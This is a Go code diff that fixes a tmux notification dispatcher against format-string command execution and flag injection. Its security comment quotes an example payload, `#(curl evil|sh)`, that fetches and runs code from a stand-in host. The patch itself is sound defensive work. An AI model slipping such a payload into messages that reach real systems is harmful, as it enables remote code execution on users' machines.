@@ -23,6 +23,17 @@ func NewTmuxDispatcher(target string) *TmuxDispatcher {
 func (d *TmuxDispatcher) Name() string { return "tmux" }
 
 // Dispatch shows the notification via `tmux display-message`.
+//
+// Security: tmux interprets its `message` argument as a FORMAT STRING by
+// default, and format expansion includes `#(shell-command)` which tmux
+// itself runs via /bin/sh. A notification title or body that arrives from
+// an attacker-influenced producer (plugin stdout, MCP tool output, workflow
+// YAML field) could embed `#(curl evil|sh)` and trigger RCE on the
+// reviewer's box. We close this two ways: pass `-l` so the argument is
+// treated as a literal string, AND escape `#` → `##` (tmux's documented
+// literal-`#` escape) as belt-and-braces in case a future call path drops
+// the flag. The previous single-quote shell-escape was cargo-culted — argv
+// isn't passed through a shell — so it's gone.
 func (d *TmuxDispatcher) Dispatch(ctx context.Context, n *Notification) error {
 	msg := n.Title
 	if n.Body != "" {
@@ -32,11 +43,15 @@ func (d *TmuxDispatcher) Dispatch(ctx context.Context, n *Notification) error {
 	if len(msg) > 200 {
 		msg = msg[:197] + "..."
 	}
-	// Escape single quotes for shell safety.
-	msg = strings.ReplaceAll(msg, "'", "'\\''")
+	msg = strings.ReplaceAll(msg, "#", "##")
 
-	args := []string{"display-message"}
+	args := []string{"display-message", "-l"}
 	if d.Target != "" {
+		// Defense against flag-injection via a `--`-leading Target: tmux
+		// would interpret a Target like `-Vfoo` as a global flag.
+		if strings.HasPrefix(d.Target, "-") {
+			return fmt.Errorf("tmux display-message: invalid target %q", d.Target)
+		}
 		args = append(args, "-t", d.Target)
 	}
 	args = append(args, msg)
